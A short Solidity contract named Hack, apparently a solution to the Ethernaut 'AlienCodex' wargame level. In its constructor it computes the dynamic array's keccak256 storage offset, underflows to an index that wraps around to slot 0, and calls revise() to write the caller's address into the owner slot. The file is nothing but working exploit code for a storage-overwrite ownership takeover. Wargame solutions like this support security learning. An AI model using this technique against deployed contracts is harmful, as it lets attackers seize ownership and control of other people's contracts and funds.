//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint256, bytes32) external;
}

contract Hack {
    constructor(address  _target) {
        uint256 i = uint256(keccak256(abi.encode(uint256(1))));
        uint h;
        unchecked {h -= i;}
        bytes32 addr = bytes32(uint256(uint160(msg.sender)));
        IAlienCodex(_target).revise(h, addr);
    }
}